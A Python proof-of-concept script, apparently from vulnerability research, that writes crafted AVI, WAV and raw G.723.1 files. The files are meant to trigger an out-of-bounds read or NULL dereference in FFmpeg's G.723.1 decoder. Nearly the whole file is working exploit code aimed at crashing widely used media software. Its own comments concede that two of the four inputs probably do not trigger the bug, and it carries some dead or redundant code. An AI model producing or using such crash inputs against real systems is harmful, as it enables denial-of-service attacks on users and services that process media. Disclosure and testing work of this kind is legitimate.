#!/usr/bin/env python3
"""
PoC generator for VULN 001: OOB Read / NULL Pointer Dereference in g723_1_decode_frame()
File: libavcodec/g723_1dec.c, line 933
Bug: buf[0] accessed before size check at line 943
"""
import struct
import os

def pack_fourcc(s):
    return s.encode('ascii') if isinstance(s, str) else s

def riff_chunk(fourcc, data):
    """Build a RIFF chunk: 4-byte tag + 4-byte size (LE) + data (padded to even)"""
    fourcc = pack_fourcc(fourcc)
    size = len(data)
    chunk = fourcc + struct.pack('<I', size) + data
    if size % 2:
        chunk += b'\x00'  # pad to even
    return chunk

def riff_list(list_type, fourcc, data):
    """Build a RIFF LIST or RIFF chunk: tag + size + list_fourcc + data"""
    fourcc_bytes = pack_fourcc(fourcc)
    inner = pack_fourcc(list_type) + data
    return pack_fourcc(b'LIST') + struct.pack('<I', len(inner)) + inner

def build_avi_g7231_zero_packet():
    """
    Build a minimal AVI file with G.723.1 audio (RIFF codec tag 0x0042)
    and a zero-size audio chunk in movi. This should trigger the OOB read/
    NULL dereference in g723_1_decode_frame() at buf[0] (line 933)
    because the demuxer produces a packet with size=0.
    """

    # --- Stream Header (strh) for audio ---
    # AVISTREAMHEADER structure (56 bytes)
    # AVISTREAMHEADER = 56 bytes
    strh = struct.pack('<4s',  b'auds')    # fccType
    strh += struct.pack('<4s', b'\x00\x00\x00\x00')  # fccHandler
    strh += struct.pack('<I',  0)  # dwFlags
    strh += struct.pack('<H',  0)  # wPriority
    strh += struct.pack('<H',  0)  # wLanguage
    strh += struct.pack('<I',  0)  # dwInitialFrames
    strh += struct.pack('<I',  1)  # dwScale
    strh += struct.pack('<I',  8000)  # dwRate
    strh += struct.pack('<I',  0)  # dwStart
    strh += struct.pack('<I',  1)  # dwLength
    strh += struct.pack('<I',  0)  # dwSuggestedBufferSize
    strh += struct.pack('<I',  0xFFFFFFFF)  # dwQuality
    strh += struct.pack('<I',  0)  # dwSampleSize
    strh += struct.pack('<HHHH', 0, 0, 0, 0)  # rcFrame

    # --- Stream Format (strf) for audio: WAVEFORMATEX ---
    # WAVEFORMATEX for G.723.1 (codec tag 0x0042)
    wFormatTag = 0x0042      # G.723.1
    nChannels = 1
    nSamplesPerSec = 8000
    nAvgBytesPerSec = 800    # approximate
    nBlockAlign = 24         # G.723.1 frame size
    wBitsPerSample = 0
    cbSize = 0

    strf = struct.pack('<HHIIHHHH',
        wFormatTag,
        nChannels,
        nSamplesPerSec,
        nAvgBytesPerSec,
        nBlockAlign,
        wBitsPerSample,
        cbSize,
        0,  # padding to match struct size
    )
    # WAVEFORMATEX is 18 bytes (without extra cbSize data)
    strf = struct.pack('<H', wFormatTag)
    strf += struct.pack('<H', nChannels)
    strf += struct.pack('<I', nSamplesPerSec)
    strf += struct.pack('<I', nAvgBytesPerSec)
    strf += struct.pack('<H', nBlockAlign)
    strf += struct.pack('<H', wBitsPerSample)
    strf += struct.pack('<H', cbSize)
    # Total: 2+2+4+4+2+2+2 = 18 bytes

    strh_chunk = riff_chunk('strh', strh)
    strf_chunk = riff_chunk('strf', strf)

    # Stream list for audio track
    strl = riff_list('strl', 'LIST', strh_chunk + strf_chunk)

    # --- Main AVI Header (avih) ---
    # AVIMAINHEADER = 56 bytes
    avih = struct.pack('<I', 0)          # dwMicroSecPerFrame
    avih += struct.pack('<I', 0)         # dwMaxBytesPerSec
    avih += struct.pack('<I', 0)         # dwPaddingGranularity
    avih += struct.pack('<I', 0x100)     # dwFlags (AVIF_HASINDEX)
    avih += struct.pack('<I', 0)         # dwTotalFrames
    avih += struct.pack('<I', 0)         # dwInitialFrames
    avih += struct.pack('<I', 1)         # dwStreams (1 audio stream)
    avih += struct.pack('<I', 0)         # dwSuggestedBufferSize
    avih += struct.pack('<I', 0)         # dwWidth
    avih += struct.pack('<I', 0)         # dwHeight
    avih += struct.pack('<IIII', 0, 0, 0, 0)  # dwReserved[4]

    avih_chunk = riff_chunk('avih', avih)

    # Header list
    hdrl_data = avih_chunk + strl
    hdrl = riff_list('hdrl', 'LIST', hdrl_data)

    # --- Movie data (movi) with ONE zero-size audio chunk ---
    # Audio chunk tag for stream 0: '00wb'
    # Zero-size chunk: just the header with size=0, no data
    zero_audio_chunk = b'00wb' + struct.pack('<I', 0)

    movi_data = zero_audio_chunk
    movi = riff_list('movi', 'LIST', movi_data)

    # --- Build complete AVI RIFF ---
    avi_data = hdrl + movi
    avi_riff = b'RIFF' + struct.pack('<I', len(avi_data) + 4) + b'AVI ' + avi_data

    return avi_riff


def build_raw_g7231_tiny():
    """
    Approach 2: Create a tiny raw G.723.1 file.
    The g723_1 raw demuxer reads 1 byte, determines frame_size = frame_size[byte & 3].
    If byte & 3 == 3, frame_size = 1 (single byte frame).
    This creates a 1-byte packet where buf[0] & 3 == 3 → dec_mode = 3 → frame_size[3] = 1
    The size check at line 943: buf_size(1) < frame_size[3](1)*channels(1) → 1 < 1 → FALSE
    So it proceeds past the check and may trigger issues in unpack_bitstream.
    For the primary OOB at buf[0]: this is a valid read of 1 byte, no OOB.
    """
    # byte with bits 1:0 = 11 (dec_mode=3), frame_size=1
    return b'\x03'


def build_raw_g7231_empty():
    """
    Approach 3: Empty raw G.723.1 file (0 bytes).
    The demuxer will get EOF on avio_r8(), then try av_new_packet with frame_size[0]=24.
    avio_read for 23 more bytes will fail with EOF, so no packet is produced.
    This likely just gives EOF without crashing.
    """
    return b''


def build_wav_g7231_zero():
    """
    Approach 4: WAV file with G.723.1 codec (0x0042) and zero-size data chunk.
    """
    # RIFF WAV structure
    fmt_tag = 0x0042        # G.723.1
    channels = 1
    sample_rate = 8000
    byte_rate = 800
    block_align = 24
    bits_per_sample = 0
    cb_size = 0

    fmt_data = struct.pack('<H', fmt_tag)
    fmt_data += struct.pack('<H', channels)
    fmt_data += struct.pack('<I', sample_rate)
    fmt_data += struct.pack('<I', byte_rate)
    fmt_data += struct.pack('<H', block_align)
    fmt_data += struct.pack('<H', bits_per_sample)
    fmt_data += struct.pack('<H', cb_size)

    fmt_chunk = riff_chunk('fmt ', fmt_data)
    data_chunk = riff_chunk('data', b'')  # zero-size data

    wav_inner = fmt_chunk + data_chunk
    wav = b'RIFF' + struct.pack('<I', len(wav_inner) + 4) + b'WAVE' + wav_inner
    return wav


if __name__ == '__main__':
    outdir = os.path.dirname(os.path.abspath(__file__))

    # Primary approach: AVI with zero-size G.723.1 chunk
    avi_data = build_avi_g7231_zero_packet()
    avi_path = os.path.join(outdir, 'vuln_001_input.avi')
    with open(avi_path, 'wb') as f:
        f.write(avi_data)
    print(f"Created {avi_path} ({len(avi_data)} bytes)")

    # Alternative: raw g723_1 with frame-size-1 byte
    raw_path = os.path.join(outdir, 'vuln_001_input.g723_1')
    with open(raw_path, 'wb') as f:
        f.write(build_raw_g7231_tiny())
    print(f"Created {raw_path} (1 byte, dec_mode=3)")

    # Alternative: WAV with zero-size data
    wav_path = os.path.join(outdir, 'vuln_001_input.wav')
    with open(wav_path, 'wb') as f:
        f.write(build_wav_g7231_zero())
    print(f"Created {wav_path} ({len(build_wav_g7231_zero())} bytes)")

    print("Done.")
